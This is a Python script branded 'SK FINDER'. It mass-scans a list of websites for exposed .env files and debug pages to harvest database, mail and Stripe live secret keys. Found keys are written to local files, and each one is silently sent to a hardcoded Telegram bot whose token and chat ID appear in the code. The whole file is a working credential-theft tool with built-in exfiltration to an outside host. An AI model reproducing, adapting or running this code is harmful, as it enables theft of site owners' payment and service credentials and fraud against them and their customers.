import re
import os
import urllib3
import time
import os.path
import requests
from os import path
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class xcol:
    LGREEN = '\033[38;2;129;199;116m'
    LRED = '\033[38;2;239;83;80m'
    RESET = '\u001B[0m'
    LXC = '\033[38;2;255;152;0m'
    GREY = '\033[38;2;158;158;158m'

skkey = 'sk_live'

class ENV:
    def send_telegram_message(self, url, sk_key):
        telegram_api_url = f"https://api.telegram.org/bot7389066468:AAHG5UyOxxHyO5oJ3h4S9_q9asorcPCxx04/sendMessage"
        message = f'𝗡𝗘𝗪 𝗦𝗞 𝗛𝗜𝗧𝗘𝗗\n\n<code>{sk_key}</code>\n\n𝗙𝗥𝗢𝗠 𝗧𝗛𝗜𝗦 𝗨𝗥𝗟\n{url}'
        params = {'chat_id': '-1002240582236', 'text': message, 'parse_mode': 'HTML'}

        try:
            response = requests.get(telegram_api_url, params=params)
            response.raise_for_status()
        except Exception as e:
            pass

    def scan(self, url):
        rr = ''
        proto = ''
        mch_env = ['DB_HOST=', 'MAIL_HOST=', 'MAIL_USERNAME=', skkey, 'APP_ENV=']
        mch_debug = ['DB_HOST', 'MAIL_HOST', 'DB_CONNECTION', 'MAIL_USERNAME', skkey, 'APP_DEBUG']
        try:
            r_env = requests.get(f'https://{url}/.env', verify=False, timeout=10, allow_redirects=False)
            r_debug = requests.post(f'https://{url}', data={'debug': 'true'}, allow_redirects=False, verify=False, timeout=15)
            resp_env = r_env.text if r_env.status_code == 200 else ''
            resp_debug = r_debug.text if r_debug.status_code == 200 else ''

            if any(key in resp_env for key in mch_env) or any(key in resp_debug for key in mch_debug):
                rr = f'{xcol.LGREEN}[+] Found: https://{url}'
                with open(os.path.join('DEBUG_ENV', f'{url}_debug_env.txt'), 'w', encoding='utf-8') as output:
                    output.write(f'ENV:\n{resp_env}\n\nDEBUG:\n{resp_debug}\n')
                if skkey in resp_env or skkey in resp_debug:
                    sk_file = open('sk.txt', 'a')
                    sk_file.write(f"URL: https://{url}\n")
                    if skkey in resp_env:
                        sk_file.write(f"From ENV:\n")
                        lin = resp_env.splitlines()
                        for x in lin:
                            if skkey in x:
                                sk_key = re.sub(f'.*{skkey}', skkey, x).replace("\"", "")
                                sk_file.write(f"{sk_key}\n")
                                self.send_telegram_message(url, sk_key)
                    if skkey in resp_debug:
                        sk_file.write(f"From DEBUG:\n")
                        lin = resp_debug.splitlines()
                        for x in lin:
                            if skkey in x:
                                sk_key = re.sub(f'.*{skkey}', skkey, x).replace("\"", "")
                                sk_file.write(f"{sk_key}\n")
                                self.send_telegram_message(url, sk_key)
                    sk_file.write('\n')
                    sk_file.close()
            else:
                rr = f'{xcol.LXC}[-] Not Found: https://{url}'
        except Exception:
            rr = f'{xcol.LRED}[-] Error in: https://{url}'
        print(rr)

if __name__ == '__main__':
    os.system('cls')
    print(""" \033[38;2;239;83;80m
█▀▀▀█  █ ▄▀   █▀▀▀ ▀█▀  █▄  █  █▀▀▄  █▀▀▀  █▀▀█ 
▀▀▀▄▄  █▀▄    █▀▀▀  █   █ █ █  █  █  █▀▀▀  █▄▄▀ 
█▄▄▄█  █  █   █    ▄█▄  █  ▀█  █▄▄▀  █▄▄▄  █  █
    \u001B[0m
    """)

    if not os.path.isdir("DEBUG_ENV"):
        os.makedirs("DEBUG_ENV")
    
    thrd = 80

    while (True):
        try:
            inpFile = input(xcol.GREY + "[URLS PATH] : " + xcol.RESET)
            with open(inpFile) as urlList:
                argFile = urlList.read().splitlines()
            break
        except:
            pass

    with ThreadPoolExecutor(max_workers=thrd) as executor:
        for data in argFile:
            executor.submit(ENV().scan, data)
            time.sleep(0.05)

    input(f"\n\n\nPRESS {xcol.LRED}ENTER{xcol.RESET} TO EXIT")